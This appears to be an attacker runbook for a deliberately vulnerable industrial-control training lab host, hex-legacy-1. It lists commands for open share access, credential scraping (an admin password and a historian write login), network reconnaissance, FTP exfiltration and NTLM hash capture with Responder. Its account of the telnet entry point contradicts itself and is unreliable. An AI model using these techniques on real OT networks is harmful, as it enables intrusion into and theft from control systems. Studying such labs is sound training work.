# Runbook: hex-legacy-1

## Entry

Telnet on port 23 drops directly into the Win95 shell with no login prompt. From any enterprise host:

```cmd
telnet 10.10.1.10
```

No username. No password. The service was configured open in 1999 and never revisited.

## Share traversal (The "Open Door")

*Always start here. Engineering shares are often wide open.*

```cmd
net view
```
*List all computers in the workgroup. Expect HEX-LEGACY-1 and UUPL-SRV-01.*

```cmd
net view \\HEX-LEGACY-1
```
*See what this machine is sharing. The public share needs no credentials.*

```cmd
net use Z: \\HEX-LEGACY-1\public
```
*Map the public share. Guest access: no username, no password required.*

```cmd
dir Z:\ /s
```
*Recursive directory dump. Pipe to a file for offline reading.*

```cmd
dir Z:\ /s > list.txt
```

The private share is restricted. The Administrator password is in `BACKUP.BAK`, left on the C: drive since the 2003 migration and never deleted.

```cmd
type C:\PRIVATE\BACKUP.BAK
```
*Shows the domain admin account recorded at migration time: Administrator / hex123.*

```cmd
net use Z: \\HEX-LEGACY-1\private hex123 /USER:Administrator
```
*Maps the private share using the credential from BACKUP.BAK. Without credentials, the share returns Access Denied.*

```cmd
dir Z:\ /s
```

Pre-mapped drives are already present: `F:` and `G:` both point at the public share.
`G:` is the faster path if you do not want to map `Z:`.

## Recursive file hunting

*Run from C:\ or from any mapped drive. The C: drive root is the starting point.*

### Files with intelligence value on this machine

```cmd
dir /s *.log
```
*Engineering logbook: LOGBOOK\ENGINEER.LOG contains every system password.*

```cmd
dir /s *.cfg
```
*Configuration files: PRIVATE\PLCACCS.CFG has historian, SCADA, and SSH credentials.*

```cmd
dir /s *.ini
```
*Windows INI files: WINDOWS\WIN.INI and WINDOWS\SYSTEM\PROTOCOL.INI.*

```cmd
dir /s *.bak
```
*Raw backups: PRIVATE\BACKUP.BAK, uncompressed, contains the domain admin password.*

```cmd
dir /s *.csv
```
*SCADA logs: UUPL\SCADA\LOGS.CSV, event log from 1999 to 2003.*

```cmd
dir /s *.txt
```
*Plain text: UUPL\NETWORK.TXT is the current network inventory including historian and SCADA IPs.*

### Files this machine does not have

These are standard searches worth running on any Win95 OT target; they come up empty here
but confirm what is not present rather than what was missed.

```cmd
dir /s *.prj
dir /s *.mdb
dir /s *.zip
dir /s *.rar
```

## Vendor-name hunting

*Project folders on OT machines are almost always named after the PLC brand.*

```cmd
dir /s *siemens*
dir /s *rockwell*
dir /s *ab*
dir /s *modicon*
dir /s *schneider*
dir /s *omron*
```

These return nothing on hex-legacy-1. The control system here is UU P&L proprietary;
vendor-name hunting establishes that there is no third-party project tree to pivot into.

Generic OT keywords:

```cmd
dir /s *plc*
dir /s *scada*
dir /s *hmi*
dir /s *historian*
```

`*plc*` returns PRIVATE\PLCACCS.CFG. The others return nothing: `*scada*`, `*hmi*`, and `*historian*` match no filenames. The SCADA logs sit at UUPL\SCADA\LOGS.CSV; the directory is named SCADA but the file is not.

## Credential and config scraping

*FIND searches inside files. Combine with dir /s output for maximum coverage.*

### Find passwords inside text-based files

```cmd
find /i "password" LOGBOOK\ENGINEER.LOG
find /i "pass" PRIVATE\PLCACCS.CFG
find /i "user" UUPL\NETWORK.TXT
```

From the mapped G: drive (public share):

```cmd
find /i "pass" G:\LOGBOOK\ENGINEER.LOG
find /i "hist_read" G:\LOGBOOK\ENGINEER.LOG
```

`hist_read / history2017` is the historian ingest credential. It appears only in ENGINEER.LOG,
not in PLCACCS.CFG. It is the credential that unlocks the historian write endpoint.

### Find IP addressing

```cmd
find /i "10.10" UUPL\NETWORK.TXT
find /i "gateway" WINDOWS\SYSTEM\PROTOCOL.INI
find /i "10.10.2" G:\UUPL\NETWORK.TXT
```

### Find Modbus and industrial protocol references

```cmd
find /i "modbus" UUPL\PROCS.TXT
find /i "coil" UUPL\PROCS.TXT
find /i "trip" UUPL\SCADA\LOGS.CSV
```

PROCS.TXT names the emergency stop coil and the actuator IPs directly. LOGS.CSV is a SCADA event log from 1999 to 2003; searching for "trip" returns the relay B trip events.

## Historian and SCADA database hunting

hex-legacy-1 does not host the historian database locally; it holds references to it.

```cmd
dir /s *.mdb
dir /s *.dbf
```

Empty. Era-appropriate formats for 1999: *.mdb (Access) and *.dbf (dBASE/FoxPro). The historian runs on 10.10.2.10 and accepts HTTP queries. The credentials to reach it are in ENGINEER.LOG and PLCACCS.CFG.

Tag and signal list exports:

```cmd
dir /s *tag*.csv
dir /s *point*.txt
dir /s *io*.csv
```

LOGS.CSV is the closest equivalent: it is a SCADA event log with asset names, not a tag database.

## Network and transfer commands

```cmd
winipcfg
```
*IP configuration. Shows 10.10.1.10 and the enterprise gateway.*

```cmd
route print
```
*Routing table. Confirms this machine sees only the enterprise segment (10.10.1.0/24).*

```cmd
arp -a
```
*ARP cache: shows recent contacts on the enterprise segment.*

```cmd
nbtstat -A 10.10.2.10
```
*NetBIOS name lookup against the historian. Returns HISTORIAN-01.*

```cmd
nbtstat -A 10.10.1.20
```
*Returns BURSAR-DESK: confirms the finance workstation is up and reachable.*

```cmd
ftp 10.10.1.10
```
*At "Name" type `anonymous`. At "Password" type anything. Then navigate with `cd LOGBOOK`, `get ENGINEER.LOG`. Same files as the public SMB share.*

*TFTP client is present. No TFTP server runs on this machine; use FTP or SMB for file retrieval.*

`hist_read / history2017` is the ingest (write) credential. It appears only in ENGINEER.LOG, not in PLCACCS.CFG. Verifying it against the historian requires a machine with an HTTP client: wizzards-retreat or bursar-desk.

## Realistic for Win95 OT?

No PowerShell. Everything is `dir`, `find`, `net`, `copy`.

No WMI. Use `net` commands instead.

No audit logging. Win95 systems did not log file access; there is no trail for dir and find.

Plaintext everything. INI, CFG, LOG, TXT files throughout, none encrypted.

Shared drives are the attack surface. Map `G:` and the public share gives a complete
network inventory and all system passwords. The private share adds the same credential
list in a different format.

The NTLMv1 configuration means any captured authentication challenge can be cracked
offline. Responder on the enterprise segment plus any browse operation by the machine
produces crackable hashes.

## Note

A single command dumps the entire `C:` drive listing for offline review:

```cmd
dir C:\ /s > C:\TEMP\c_drive_listing.txt
```

Then exfiltrate via FTP (anonymous on port 21) or copy to a mapped share on
the attacker machine.

The telnet service is on port 23 but presents a Linux login prompt, not a DOS prompt.
Participants who telnet in expecting a Windows shell encounter a brief reality check.

## Quick reference

```
net view                              find machines in workgroup
net use Z: \\HEX-LEGACY-1\public     map public share (no password)
net use Z: \\HEX-LEGACY-1\private    map private share (Administrator / hex123)
dir Z:\ /s > list.txt                dump everything
dir /s *.log                         find ENGINEER.LOG (all passwords)
dir /s *.cfg                         find PLCACCS.CFG (historian, SCADA, SSH)
dir /s *.bak                         find BACKUP.BAK (domain admin password)
dir /s *siemens*                     vendor hunting (empty on this host)
find /i "pass" LOGBOOK\ENGINEER.LOG  credential scrape
find /i "hist_read" G:\LOGBOOK\ENGINEER.LOG   ingest credential (logbook only)
winipcfg                             own IP
route print                          routing table
nbtstat -A 10.10.2.10                historian NetBIOS name
ftp 10.10.1.10                       anonymous FTP (Name: anonymous, Password: anything)
```
